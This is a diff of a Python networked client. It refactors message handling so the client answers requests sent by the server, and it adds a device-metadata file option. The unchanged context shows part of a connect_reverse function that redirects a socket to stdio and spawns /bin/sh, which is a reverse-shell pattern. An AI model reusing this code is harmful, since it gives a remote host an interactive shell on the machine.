@@ -24,12 +24,13 @@ def connect_reverse(host: str, port: int) -> None:
     os.dup2(s.fileno(),2)
     pty.spawn("/bin/sh")
 
-def recv_from_server(server: socket.socket) -> None:
+def recv_from_server(client: Client) -> None:
     """Receive packets from the server
 
     Args:
-        server: Socket of the server we're connected to
+        client: Receiving client
     """
+    server = client.socket
     while True:
         try:
             # loop over all received messages
@@ -43,6 +44,10 @@ def recv_from_server(server: socket.socket) -> None:
                     
                 message_length: int = int(decode_json(message_header))
                 message: dict = json.loads(server.recv(message_length).decode('utf-8'))
+                client_response = client.handle_request(message)
+
+                if client_response:
+                    client.send(client_response)
                 print('\r', message, end=f'\n{client.name} > ')
 
                 # Print message
@@ -90,15 +95,19 @@ if __name__ == '__main__':
                         help='client type')
     parser.add_argument('name', type=str,
                         help='client name for identification, without whitespaces')
+    parser.add_argument('-file', metavar='f', type=str, default='',
+                        help='file containing device metadata')
     args = parser.parse_args()
 
     client_socket: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((args.hostname, args.port))
 
     # send registration
-    client: Client = register_client(args.client_type, args.name, client_socket)
+    client: Client = create_client(args.client_type, args.name, client_socket)
+    if isinstance(client, Device):
+        client.metadata_file = args.file
     client_socket.send(client.registration_packet(args.client_type, args.name))
 
-    t = Thread(target=recv_from_server, args=(client_socket,))
+    t = Thread(target=recv_from_server, args=(client,))
     t.start()
     send_to_server(client_socket)
